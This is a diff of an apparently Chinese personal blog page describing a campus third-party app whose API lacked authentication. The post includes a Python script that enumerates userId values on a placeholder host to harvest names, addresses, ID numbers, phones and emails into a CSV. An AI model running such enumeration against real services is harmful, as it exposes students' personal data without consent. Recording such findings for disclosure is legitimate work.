@@ -184,8 +184,7 @@
         <div class="row">
             <!-- Post Container -->
             <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
-                <hr>
-<h1 id="校园提供给第三方的接口信息泄露"><a href="#校园提供给第三方的接口信息泄露" class="headerlink" title="校园提供给第三方的接口信息泄露"></a>校园提供给第三方的接口信息泄露</h1><hr>
+                <h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="校园提供给第三方的接口信息泄露"><a href="#校园提供给第三方的接口信息泄露" class="headerlink" title="校园提供给第三方的接口信息泄露"></a>校园提供给第三方的接口信息泄露</h1><hr>
 <p>之前学校和第三方合作，让我们用到的某款app，好奇测试，发现其有严重的身份验证缺失，可以随意访问个人信息，用python写了个可以爬取所有信息的脚本。（很早之前的了，做个记录）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Time    : 2018/6/23</span><br><span class="line"># @Author  : XDN01</span><br><span class="line"># @Site    : www.raosong.cc</span><br><span class="line"># @File    : xd-xiaoweiapp-spider.py</span><br><span class="line">import requests</span><br><span class="line">import csv</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">with open(&quot;./spider.csv&quot;,&quot;w&quot;,encoding=&apos;utf-8&apos;) as f:</span><br><span class="line">    writer = csv.writer(f)</span><br><span class="line">    key_array = [&apos;userId&apos;,&apos;userNum&apos;,&apos;name&apos;,&apos;sex&apos;,&apos;address&apos;,&apos;certificate&apos;,&apos;nationId&apos;,&apos;nationName&apos;,</span><br><span class="line">   &apos;phone&apos;,&apos;email&apos;,&apos;schoolName&apos;,&apos;faculty&apos;,&apos;grade&apos;,&apos;class&apos;,&apos;profession&apos;,&apos;sysStuDetailId&apos;,&apos;sourceId&apos;,</span><br><span class="line">    &apos;sourceName&apos;,&apos;feature&apos;,&apos;type&apos;,&apos;suspId&apos;]</span><br><span class="line">    writer.writerow(key_array)</span><br><span class="line"></span><br><span class="line">    for a in range(2,20):</span><br><span class="line">        url = &apos;http://example.com/search.php?userId=&#123;&#125;&apos;.format(a)</span><br><span class="line">        json_data =requests.get(url).json()[&apos;data&apos;]</span><br><span class="line">        # print(json_data)</span><br><span class="line">        value_array = []</span><br><span class="line">        for k in key_array:</span><br><span class="line">            if k in json_data:</span><br><span class="line">                value_array.append(json_data[k])</span><br><span class="line">            else:</span><br><span class="line">                value_array.append(&apos;null&apos;)</span><br><span class="line">        # print(value_array)</span><br><span class="line">        writer.writerow(value_array)</span><br><span class="line">        print(&apos;第&#123;&#125;条数据写入完成&apos;.format(a-1))</span><br></pre></td></tr></table></figure></p>
 
                 <hr>
@@ -194,7 +193,7 @@
                 <ul class="pager">
                     
                     <li class="previous">
-                        <a href="/2019/04/15/22.WIN10自动更新/" data-toggle="tooltip" data-placement="top" title="WIN10自动更新">&larr; Previous Post</a>
+                        <a href="/2019/04/15/20. PCI-DSS(V3.2.1)学习笔记(七)/" data-toggle="tooltip" data-placement="top" title="PCI-DSS(V3.2)学习笔记(七)">&larr; Previous Post</a>
                     </li>
                     
                     
@@ -215,8 +214,8 @@
 
             <div class="hidden-xs col-sm-3 toc-col">
                 <div class="toc-wrap">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#校园提供给第三方的接口信息泄露"><span class="toc-text">校园提供给第三方的接口信息泄露</span></a></li></ol>
-                </div>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#"><span class="toc-text"></span></a></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#校园提供给第三方的接口信息泄露"><span class="toc-text">校园提供给第三方的接口信息泄露</span></a>
+                </li></div>
             </div>
         </div>
 
